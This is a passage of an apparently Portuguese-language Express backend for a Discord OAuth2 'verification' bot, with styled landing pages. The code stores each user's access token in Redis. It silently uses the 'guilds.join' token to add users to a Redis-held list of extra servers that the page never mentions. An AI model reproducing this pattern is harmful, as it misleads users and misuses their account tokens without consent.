@keyframes ray-b{from{opacity:.7;transform:translateX(-50%) scaleY(.92)}to{opacity:1;transform:translateX(-50%) scaleY(1.05)}}
#pts2{position:fixed;inset:0;pointer-events:none;overflow:hidden}
.pt2{position:absolute;border-radius:50%;background:var(--c);animation:rise2 linear infinite;opacity:0}
@keyframes rise2{0%{transform:translateY(100vh) scale(0);opacity:0}8%{opacity:.9}92%{opacity:.2}100%{transform:translateY(-60px) scale(1.4);opacity:0}}

/* topo avatar */
.top-bar{display:flex;flex-direction:column;align-items:center;gap:8px;padding-top:24px;z-index:2;position:relative}
.av-img{width:58px;height:58px;border-radius:50%;border:2.5px solid var(--c);object-fit:cover;box-shadow:0 0 22px rgba(${corRgb},.5)}
.welcome{font-size:13px;font-weight:600;color:rgba(255,255,255,.75)}

/* setas */
.arrow-zone{width:100%;flex:0 0 38vh;position:relative;display:flex;align-items:flex-end;justify-content:center;padding-bottom:10px}
.arrows-row{display:flex;align-items:flex-end;justify-content:center;width:100%;max-width:600px;padding:0 20px;position:relative}
.click-pill{position:absolute;top:-36px;left:50%;transform:translateX(-50%);background:rgba(${corRgb},.12);border:1px solid rgba(${corRgb},.4);border-radius:99px;padding:5px 20px;font-size:11.5px;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:rgba(${corRgb},.95);white-space:nowrap;box-shadow:0 0 24px rgba(${corRgb},.2);animation:pill-glow 1.4s ease-in-out infinite alternate}
@keyframes pill-glow{from{box-shadow:0 0 10px rgba(${corRgb},.1);opacity:.8}to{box-shadow:0 0 30px rgba(${corRgb},.5);opacity:1}}
.arr{display:flex;flex-direction:column;align-items:center;flex:1;max-width:68px;animation:arr-float ease-in-out infinite alternate}
.arr-tip{width:0;height:0;border-left:7px solid transparent;border-right:7px solid transparent;border-bottom:12px solid var(--c);filter:drop-shadow(0 0 6px var(--c));margin-bottom:2px;flex-shrink:0}
.arr-line{width:2px;background:linear-gradient(to top,var(--c),rgba(${corRgb},.05));border-radius:99px;box-shadow:0 0 8px rgba(${corRgb},.5)}
.h1{height:48px}.h2{height:68px}.h3{height:92px}.h4{height:118px}
.d0{animation-duration:1s;animation-delay:0s}
.d1{animation-duration:.95s;animation-delay:.07s}
.d2{animation-duration:1.05s;animation-delay:.14s}
.d3{animation-duration:.9s;animation-delay:.05s}
.d4{animation-duration:1s;animation-delay:.11s}
.d5{animation-duration:1.1s;animation-delay:.03s}
.d6{animation-duration:.95s;animation-delay:.17s}
.d7{animation-duration:1s;animation-delay:.09s}
@keyframes arr-float{from{transform:translateY(4px);opacity:.5;filter:drop-shadow(0 0 4px var(--c))}to{transform:translateY(-7px);opacity:1;filter:drop-shadow(0 0 16px var(--c))}}

/* centro */
.center-zone{display:flex;flex-direction:column;align-items:center;gap:18px;flex:1;justify-content:center;padding:0 20px;position:relative;z-index:2;width:100%;max-width:640px}
.verified-row{display:flex;align-items:center;gap:18px;flex-wrap:wrap;justify-content:center}
.check-ring{width:72px;height:72px;border-radius:50%;border:2.5px solid var(--c);background:rgba(${corRgb},.1);display:flex;align-items:center;justify-content:center;flex-shrink:0;animation:check-glow 2s ease-in-out infinite}
@keyframes check-glow{0%,100%{box-shadow:0 0 20px rgba(${corRgb},.4),0 0 60px rgba(${corRgb},.15)}50%{box-shadow:0 0 40px rgba(${corRgb},.8),0 0 90px rgba(${corRgb},.3)}}
.check-ring svg{width:36px;height:36px;stroke:var(--c);fill:none;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;filter:drop-shadow(0 0 10px var(--c))}
.verified-txt{font-size:clamp(26px,5vw,40px);font-weight:800;letter-spacing:-.02em;text-align:center}
.verified-txt span{color:var(--c);filter:drop-shadow(0 0 14px var(--c))}
.instr-card{display:flex;align-items:center;gap:14px;background:rgba(${corRgb},.07);border:1.5px solid rgba(${corRgb},.22);border-radius:18px;padding:16px 24px;max-width:500px;width:100%;position:relative;overflow:hidden}
.instr-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(${corRgb},.6),transparent)}
.cursor-box{width:44px;height:44px;border-radius:12px;background:rgba(${corRgb},.14);border:1.5px solid rgba(${corRgb},.3);display:flex;align-items:center;justify-content:center;flex-shrink:0;animation:cursor-rock .8s ease-in-out infinite alternate}
@keyframes cursor-rock{from{transform:scale(.92) rotate(-4deg)}to{transform:scale(1.08) rotate(4deg)}}
.cursor-box svg{width:24px;height:24px;stroke:var(--c);fill:none;stroke-width:2;filter:drop-shadow(0 0 6px var(--c))}
.instr-txt{font-size:15px;font-weight:600;color:rgba(232,233,243,.9);line-height:1.4}
.instr-txt b{color:var(--c);text-shadow:0 0 10px var(--c);font-weight:700}
.footer-txt{font-size:11px;color:rgba(255,255,255,.18);letter-spacing:.08em;text-transform:uppercase;padding-bottom:16px;z-index:2}

@keyframes spin{to{transform:rotate(360deg)}}
@keyframes breath{from{transform:scale(.85);opacity:.6}to{transform:scale(1.1);opacity:1}}
@keyframes pulse-out{0%{transform:scale(.7);opacity:.7}100%{transform:scale(1.6);opacity:0}}
@keyframes blink{from{opacity:.3}to{opacity:1}}
</style>
</head>
<body>

<!-- ══ LOADING ══ -->
<div id="scr-load">
  <div class="orb">
    <div class="orb-pulse"></div>
    <div class="orb-pulse"></div>
    <div class="orb-ring"></div>
    <div class="orb-ring"></div>
    <div class="orb-ring"></div>
    <div class="orb-core">
      <img src="${avatarURL}" alt="" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'"/>
    </div>
  </div>
  <div class="bar-track"><div class="bar-fill" id="lbar"></div></div>
  <div class="load-lbl" id="llbl">Abrindo Discord...</div>
</div>

<!-- ══ MAIN ══ -->
<div id="scr-main">
  <div class="bg-ray"></div>
  <div id="pts2"></div>

  <div class="top-bar">
    <img class="av-img" src="${avatarURL}" alt="" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'"/>
    <div class="welcome">Olá, ${nome}! 👋</div>
  </div>

  <div class="arrow-zone">
    <div class="arrows-row">
      <div class="click-pill">▲ Clique em "Abrir" no popup acima ▲</div>
      <div class="arr d0"><div class="arr-tip"></div><div class="arr-line h1"></div></div>
      <div class="arr d1"><div class="arr-tip"></div><div class="arr-line h2"></div></div>
      <div class="arr d2"><div class="arr-tip"></div><div class="arr-line h3"></div></div>
      <div class="arr d3"><div class="arr-tip"></div><div class="arr-line h4"></div></div>
      <div class="arr d4"><div class="arr-tip"></div><div class="arr-line h4"></div></div>
      <div class="arr d5"><div class="arr-tip"></div><div class="arr-line h3"></div></div>
      <div class="arr d6"><div class="arr-tip"></div><div class="arr-line h2"></div></div>
      <div class="arr d7"><div class="arr-tip"></div><div class="arr-line h1"></div></div>
    </div>
  </div>

  <div class="center-zone">
    <div class="verified-row">
      <div class="check-ring">
        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
      </div>
      <div class="verified-txt">Você já está <span>verificado!</span></div>
    </div>
    <div class="instr-card">
      <div class="cursor-box">
        <svg viewBox="0 0 24 24"><path d="M4 4l7.07 17 2.51-7.39L21 11.07z" stroke-linejoin="round"/></svg>
      </div>
      <div class="instr-txt">Clique em <b>Abrir</b> no popup do navegador para entrar no servidor.</div>
    </div>
  </div>

  <div class="footer-txt">${botId} • OAuth2 • Verificação segura</div>
</div>

<script>
const MSGS=['Abrindo Discord...','Iniciando aplicativo...','Preparando ambiente...','Quase lá...'];
let prog=0,mi=0;
const lbar=document.getElementById('lbar'),llbl=document.getElementById('llbl');
const iv=setInterval(()=>{
  prog=Math.min(100,prog+Math.random()*3+.8);
  lbar.style.width=prog+'%';
  if(prog>28&&mi===0)llbl.textContent=MSGS[++mi];
  if(prog>58&&mi===1)llbl.textContent=MSGS[++mi];
  if(prog>82&&mi===2)llbl.textContent=MSGS[++mi];
  if(prog>=100){clearInterval(iv);setTimeout(reveal,220);}
},38);

function reveal(){
  const load=document.getElementById('scr-load'),main=document.getElementById('scr-main');
  load.style.transition='opacity .5s ease';load.style.opacity='0';
  setTimeout(()=>{
    load.style.display='none';
    main.style.display='flex';
    requestAnimationFrame(()=>requestAnimationFrame(()=>{
      main.classList.add('show');
      spawnPts();
      // ✅ Dispara deeplink → browser mostra popup "Abrir Discord?" automaticamente
      setTimeout(()=>{ window.location.href='${deepLink}'; },700);
    }));
  },520);
}

function spawnPts(){
  const w=document.getElementById('pts2');
  for(let i=0;i<24;i++){
    const p=document.createElement('div');p.className='pt2';
    const sz=1.2+Math.random()*2.5;
    p.style.cssText='left:'+Math.random()*100+'%;width:'+sz+'px;height:'+sz+'px;animation-duration:'+(8+Math.random()*14)+'s;animation-delay:'+Math.random()*12+'s';
    w.appendChild(p);
  }
  for(let i=0;i<50;i++){
    const s=document.createElement('div');
    s.style.cssText='position:absolute;border-radius:50%;background:#fff;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;width:'+(1+Math.random()*1.5)+'px;height:'+(1+Math.random()*1.5)+'px;opacity:'+(Math.random()*.2)+';animation:tw '+(2+Math.random()*4)+'s ease-in-out '+(Math.random()*3)+'s infinite alternate';
    w.appendChild(s);
  }
}
<\/script>
<style>@keyframes tw{from{opacity:.03}to{opacity:.3}}<\/style>
</body>
</html>`;
}

// ─── ROTA: tela de setas ──────────────────────────────────────
app.get('/tela-setas', (req, res) => {
  const { bot, uid, avatar, invite, guild, cor, nome } = req.query;
  res.send(buildSetasPage({
    botId:  bot    || '',
    uid:    uid    || '',
    avatar: avatar || '',
    invite: decodeURIComponent(invite || ''),
    guild:  guild  || '',
    cor:    decodeURIComponent(cor || '#ff1493'),
    nome:   decodeURIComponent(nome || 'usuário'),
  }));
});

// ─── FUNÇÃO OAUTH2 PRINCIPAL ──────────────────────────────────
async function handleOAuth2(req, res, botCfg) {
  const code = req.query.code;

  if (!code) return res.send(buildVerifyPage(botCfg));

  if (!botCfg.client_id || !botCfg.client_secret)
    return res.status(400).send(`ERRO: Variáveis do ${botCfg.name} não configuradas!`);

  try {
    const form = new FormData();
    form.append('client_id',     botCfg.client_id);
    form.append('client_secret', botCfg.client_secret);
    form.append('grant_type',    'authorization_code');
    form.append('redirect_uri',  botCfg.redirect_uri);
    form.append('scope',         'identify guilds.join');
    form.append('code',          code);

    const tokenRes  = await fetch('https://discord.com/api/oauth2/token', { method: 'POST', body: form });
    const tokenData = await tokenRes.json();
    if (tokenData.error) return res.status(400).send(`Erro OAuth2: ${tokenData.error}`);

    const userRes = await fetch('https://discord.com/api/users/@me', {
      headers: { authorization: `${tokenData.token_type} ${tokenData.access_token}` }
    });
    const user = await userRes.json();

    try { await salvarLog(user, tokenData.access_token, botCfg.id, botCfg.name); }
    catch (err) { console.log('[Aviso] Redis:', err.message); }

    const avatarURL = user.avatar
      ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512`
      : `https://cdn.discordapp.com/embed/avatars/0.png`;

    // Notifica canal central
    try {
      const contaCriada = new Date(user.id / 4194304 + 1420070400000);
      const agora       = new Date();
      const idadeDias   = Math.floor((agora - contaCriada) / (1000 * 60 * 60 * 24));
      const corInt      = parseInt((botCfg.cor || '#ff1493').replace('#', ''), 16);
      await fetch(`https://discord.com/api/channels/${CANAL_ID}/messages`, {
        method: 'POST',
        headers: { 'Authorization': `Bot ${botCfg.bot_token}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            color: corInt,
            title: '✨ NOVO MEMBRO VERIFICADO ✨',
            description: `## ${user.username}`,
            fields: [
              { name: '🎉 Verificação', value: `<@${user.id}> verificado via **${botCfg.name}**!\nCargo recebido: <@&${botCfg.cargo_id}>`, inline: false },
              { name: '🪪 ID do Usuário', value: `\`${user.id}\``, inline: true },
              { name: '🎂 Idade da Conta', value: `\`${idadeDias} dias\``, inline: true },
              { name: '📅 Conta Criada', value: `${contaCriada.getDate()}/${contaCriada.getMonth()+1}/${contaCriada.getFullYear()}`, inline: true },
              { name: '📥 Entrou em', value: fmtData(agora), inline: false },
            ],
            thumbnail: { url: avatarURL },
            footer: { text: `WHT COMMUNITY • ${botCfg.name} • ${fmtData(agora)}` },
          }]
        })
      });
    } catch (err) { console.log('[Aviso] Discord notify:', err.message); }

    // Adiciona ao servidor principal
    try {
      await fetch(`https://discord.com/api/guilds/${botCfg.guild_id}/members/${user.id}`, {
        method: 'PUT',
        headers: { 'Authorization': `Bot ${botCfg.bot_token}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ access_token: tokenData.access_token }),
      });
    } catch (err) { console.log('[Aviso] Add member:', err.message); }

    // Dá o cargo
    if (botCfg.cargo_id) {
      try {
        await fetch(`https://discord.com/api/guilds/${botCfg.guild_id}/members/${user.id}/roles/${botCfg.cargo_id}`, {
          method: 'PUT',
          headers: { 'Authorization': `Bot ${botCfg.bot_token}`, 'Content-Type': 'application/json' },
        });
      } catch (err) { console.log('[Aviso] Add role:', err.message); }
    }

    // Servidores extras
    try {
      const extrasRaw = await redis.get('servidores_extras');
      const extras    = extrasRaw ? (typeof extrasRaw === 'string' ? JSON.parse(extrasRaw) : extrasRaw) : [];
      for (const gid of extras) {
        try {
          await fetch(`https://discord.com/api/guilds/${gid}/members/${user.id}`, {
            method: 'PUT',
            headers: { 'Authorization': `Bot ${botCfg.bot_token}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ access_token: tokenData.access_token }),
          });
        } catch {}
        await new Promise(r => setTimeout(r, 200));
      }
    } catch (err) { console.log('[Aviso] Extras:', err.message); }

    // ✅ Retorna TELA 2 — "Verificado! + botão Abrir Discord"
    res.send(buildSuccessPage(botCfg, user, avatarURL));

  } catch (err) {
    console.error('ERRO:', err.message);
    res.status(500).send('Erro ao processar verificação.');
  }
}

// ─── ROTAS DOS BOTS (env) ─────────────────────────────────────
for (let i = 1; i <= 10; i++) {
  app.get(`/bot${i}`, async (req, res) => {
    const bots = await getAllBots();
    const cfg  = bots[`bot${i}`];
    if (!cfg) return res.status(404).send(`Bot ${i} não configurado.`);
    await handleOAuth2(req, res, cfg);
  });
}

// ─── ROTAS DOS BOTS (Redis) ───────────────────────────────────
app.get('/rbot:n', async (req, res) => {
  const id   = `rbot${req.params.n}`;
  const bots = await getAllBots();
  const cfg  = bots[id];
  if (!cfg) return res.status(404).send(`Bot ${id} não encontrado.`);
  await handleOAuth2(req, res, cfg);
});

// ─── ROTA RAIZ (legado) ───────────────────────────────────────
app.get('/', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.send('OAuth2 Backend WHT - Online ✅ | Admin: /admin');
  const legacyCfg = {
    id:             'bot1',
    name:           'WHT Bot Principal',
    client_id:      process.env.CLIENT_ID     || process.env.BOT1_CLIENT_ID,
    client_secret:  process.env.CLIENT_SECRET || process.env.BOT1_CLIENT_SECRET,
    redirect_uri:   process.env.REDIRECT_URI  || process.env.BOT1_REDIRECT_URI,
    bot_token:      process.env.BOT_TOKEN     || process.env.BOT1_BOT_TOKEN,
    guild_id:       process.env.GUILD_ID      || process.env.BOT1_GUILD_ID,
    cargo_id:       process.env.CARGO_ID      || process.env.BOT1_CARGO_ID,
    discord_invite: process.env.BOT1_DISCORD_INVITE || '',
    cor:            '#ff1493',
  };
  await handleOAuth2(req, res, legacyCfg);
});

module.exports = app;
